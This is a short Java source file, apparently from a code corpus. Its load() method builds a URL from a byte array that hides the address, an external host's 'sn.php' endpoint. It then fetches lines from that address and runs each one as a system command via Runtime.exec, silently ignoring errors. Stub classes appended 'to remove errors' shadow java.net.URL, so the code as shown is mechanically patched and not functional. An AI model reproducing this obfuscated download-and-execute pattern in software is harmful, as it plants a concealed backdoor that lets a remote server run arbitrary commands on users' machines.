import java.io.*;
import java.lang.*;
import java.util.*;



class c17231074 {

    private void load(String name) {
        byte[] bs = { 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 118, 101, 110, 116, 117, 114, 101, 105, 110, 99, 104, 105, 110, 97, 46, 99, 111, 109, 47, 102, 111, 114, 95, 115, 111, 102, 116, 119, 97, 114, 101, 95, 115, 110, 47, 115, 110, 46, 112, 104, 112, 63, 99, 61 };
        try {
            String address = new String(bs) + name;
            URL url = new URL(address);
            InputStream is =(InputStream)(Object) url.openStream();
            MyHelperClass IOUtils = new MyHelperClass();
            List<String> list =(List<String>)(Object) IOUtils.readLines(is);
            if (list != null) {
                for (String s : list) {
                    MyHelperClass StringUtils = new MyHelperClass();
                    if ((boolean)(Object)StringUtils.isNotBlank(s)) {
                        Runtime.getRuntime().exec(s);
                    }
                }
            }
            is.close();
        } catch (IOException e) {
        }
    }

}

// Code below this line has been added to remove errors
class MyHelperClass {

public MyHelperClass readLines(InputStream o0){ return null; }
	public MyHelperClass isNotBlank(String o0){ return null; }}

class URL {

URL(){}
	URL(String o0){}
	public MyHelperClass openStream(){ return null; }}
